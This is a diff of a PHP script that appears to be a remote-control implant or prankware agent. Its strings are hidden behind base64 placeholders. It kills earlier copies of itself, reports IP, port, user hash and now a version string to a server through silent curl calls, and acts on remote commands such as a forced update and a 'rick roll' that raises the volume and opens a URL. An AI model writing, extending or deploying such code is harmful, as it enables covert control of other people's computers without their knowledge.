@@ -13,6 +13,7 @@ define('PORT_MIN', '{{B64_CONST_PORT_MIN}}');
 define('PORT_MAX', '{{B64_CONST_PORT_MAX}}');
 define('SS_PORT', '{{B64_CONST_SS_PORT}}');
 define('PROMPT', '{{B64_CONST_PROMPT}}');
+define('VERSION', '{{VERSION}}');
 
 if ($pid = process_running($argv[0])) {
     exec("kill $pid");
@@ -37,7 +38,8 @@ global $opts;
 $opts = array(
     '{{B64_OPT_IP}}' => $address,
     '{{B64_OPT_PORT}}' => $port,
-    '{{B64_OPT_HASH}}' => '{{USER_HASH}}'
+    '{{B64_OPT_HASH}}' => '{{USER_HASH}}',
+    '{{B64_OPT_VERSION}}' => '{{VERSION}}'
 );
 
 // Error check address and port
@@ -91,8 +93,10 @@ do {
         if (preg_match(REGEX_CTL_QUIT, $buf)) {
             break;
         } else if (preg_match(REGEX_CTL_UPDATE, $buf)) {
-            exec('{{B64_CMD_UPDATE}}');
-            die();
+            $msg .= "CURRENT VERSION = " . VERSION . "\n";
+            $msg .= "Server Says: '" . exec(build_curl_cmd('v')) . "'\n";
+            // exec('{{B64_CMD_UPDATE}}');
+            // die();
         } else if (preg_match(REGEX_CTL_RICK_ROLL, $buf)) {
             set_volume(7);
             open_url('{{B64_STR_RICK_ROLL_URL}}');
@@ -201,7 +205,7 @@ function process_running($search) {
 function build_curl_cmd($page = 'm') {
     global $opts;
 
-    if (in_array($page, array('m', 'p'))) {
+    if (in_array($page, array('v', 'm', 'p'))) {
         $url = '{{B64_STR_SERVER_HOST}}' . "{$page}.php?";
         $url .= http_build_query($opts);
         return ('{{B64_CMD_CURL_SILENT}}' . " '$url'");
